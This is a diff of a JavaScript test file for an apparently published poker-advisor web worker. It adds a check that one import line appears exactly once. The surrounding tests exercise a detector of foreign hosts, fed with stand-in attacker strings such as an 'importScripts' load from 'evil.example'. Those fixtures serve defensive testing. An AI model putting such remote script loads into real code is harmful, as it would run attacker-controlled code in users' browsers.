@@ -174,6 +174,12 @@ test("the published worker sends an opponent's move with a read to engine/, and 
   assert.ok(at("adv.play(st, pl['seat']") < at("except Cancelled:"));
 });
 
+test("the published worker imports the tournament preflop solve at start, after the stored games and before the Advisor", () => {
+  const worker = editWorker(upstream);
+  const line = "import engine.pf_stored; import engine.pf_icm_study; from gto.advisor import Advisor;";
+  assert.equal(worker.split(line).length, 2);
+});
+
 test("hostsNamed sees URLs in comments and strings, and leaves the worker's own paths alone", () => {
   assert.deepEqual(hostsNamed("// from https://evil.example/x.js\n"), ["https://evil.example/x.js"]);
   assert.deepEqual(hostsNamed('importScripts("//evil.example/x.js")'), ["//evil.example/"]);
